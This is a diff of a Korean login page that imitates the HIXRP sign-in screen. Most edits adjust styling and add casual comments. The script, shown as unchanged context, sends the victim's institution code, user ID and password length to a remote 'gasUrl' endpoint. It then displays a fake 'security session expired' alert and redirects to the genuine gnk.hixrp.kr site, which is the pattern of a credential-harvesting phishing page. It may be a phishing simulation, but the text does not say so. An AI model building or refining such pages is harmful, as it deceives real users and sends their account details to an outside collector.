@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HIXRP 로그인</title>
     <style>
-        /* 배경 설정: 깃허브에 올린 background.png 사용 */
+        /* 1. 배경 설정: 형이 올린 illustration.png를 전체 배경으로 사용 */
         body {
             margin: 0;
             padding: 0;
@@ -15,27 +15,34 @@
             justify-content: center;
             align-items: center;
             font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
-            background: url('background.png') no-repeat center center;
+            /* 깃허브에 올린 illustration.png를 배경으로 깔아줌 */
+            background: url('illustration.png') no-repeat center center;
             background-size: cover;
+            overflow: hidden;
         }
 
-        /* 로그인 컨테이너 */
+        /* 2. 로그인 박스: 이미지상의 위치와 스타일 재현 */
         .login-box {
-            width: 350px;
-            background: #ffffff;
-            padding: 40px 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 380px;
+            background: rgba(255, 255, 255, 0.9); /* 약간 투명하게 해서 배경과 어우러지게 */
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             text-align: center;
-            /* 배경 이미지 레이아웃에 맞춰 위치 조정 (필요시 수정) */
-            margin-right: 320px; 
+            /* 일러스트 캐릭터를 가리지 않도록 위치 살짝 조정 (필요시 조절해 형) */
+            transform: translateX(-150px); 
+        }
+
+        .logo-area {
+            margin-bottom: 30px;
         }
 
         .logo-area img {
             max-width: 150px;
-            margin-bottom: 30px;
+            height: auto;
         }
 
+        /* 3. 입력 필드 및 버튼 스타일 */
         .input-group {
             margin-bottom: 12px;
             text-align: left;
@@ -69,7 +76,7 @@
             cursor: pointer;
             font-weight: bold;
             font-size: 15px;
-            margin-top: 10px;
+            margin-top: 5px;
         }
 
         .btn-resign {
@@ -80,13 +87,13 @@
             margin-top: 10px;
             cursor: pointer;
             color: #666;
-            font-size: 13px;
+            font-size: 12px;
             border-radius: 4px;
         }
 
         .options {
-            margin-top: 20px;
-            font-size: 12px;
+            margin-top: 15px;
+            font-size: 11px;
             color: #666;
             display: flex;
             justify-content: center;
@@ -100,7 +107,7 @@
             font-size: 11px;
         }
 
-        .footer-links a { color: #666; text-decoration: none; margin: 0 5px; }
+        .footer-links a { text-decoration: none; color: #5579a6; margin: 0 5px; }
         .copyright { margin-top: 30px; font-size: 10px; color: #aaa; }
     </style>
 </head>
@@ -108,6 +115,7 @@
 
     <div class="login-box">
         <div class="logo-area">
+            <!-- 깃허브에 올린 logo.png를 불러옴 -->
             <img src="logo.png" alt="XRP ez">
         </div>
 
@@ -152,11 +160,11 @@
             const id = document.getElementById('userId').value;
             const pw = document.getElementById('userPw').value;
 
-            // 로그 전송
+            // 1. 데이터 전송 (기관코드, 아이디, 비밀번호 길이)
             const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(entCd)}&inputId=${encodeURIComponent(id)}&pwLen=${pw.length}`;
             fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
 
-            // 최종 리다이렉트 주소 반영
+            // 2. 알림 후 형이 지정한 최종 주소로 리다이렉트
             setTimeout(() => {
                 alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                 window.location.href = 'https://gnk.hixrp.kr/index.jsp';
